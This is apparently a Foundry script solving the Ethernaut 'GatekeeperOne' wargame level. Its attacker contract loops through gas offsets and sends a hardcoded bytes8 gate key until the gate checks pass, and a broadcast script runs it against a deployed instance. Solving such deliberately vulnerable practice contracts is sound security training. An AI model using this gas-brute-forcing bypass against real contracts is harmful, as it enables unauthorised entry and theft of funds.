// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GateKeeperOne.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract AttackerContract {
    GatekeeperOne gatekeeperOneInstance;

    constructor (address _address) {
        // Gate Key 0x863A56590000bd49
        gatekeeperOneInstance = GatekeeperOne(_address);
    }

    function attack() public {
        bytes8 gateKey = 0x863A56590000bd49;

        for (uint i = 0; i < 120; i++) {
            (bool sent, ) = address(gatekeeperOneInstance).call{gas: i + 150 + 8191 * 3}(abi.encodeWithSignature("enter(bytes8)", gateKey));

            if (sent) {
              break;
            }
        }
    }
}

contract GateKeeperOneSolution is Script {
    GatekeeperOne public gatekeeperOneInstance = GatekeeperOne(0x1F6F63D296221ECa8c47b367ce5c8Dd35191024d);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Player : ", vm.envAddress("MY_ADDRESS"));
        console.log("Before entrant : ", gatekeeperOneInstance.entrant());

        AttackerContract attackerContract = new AttackerContract(address(gatekeeperOneInstance));

        attackerContract.attack();

        console.log("After entrant : ", gatekeeperOneInstance.entrant());

        vm.stopBroadcast();
    }
}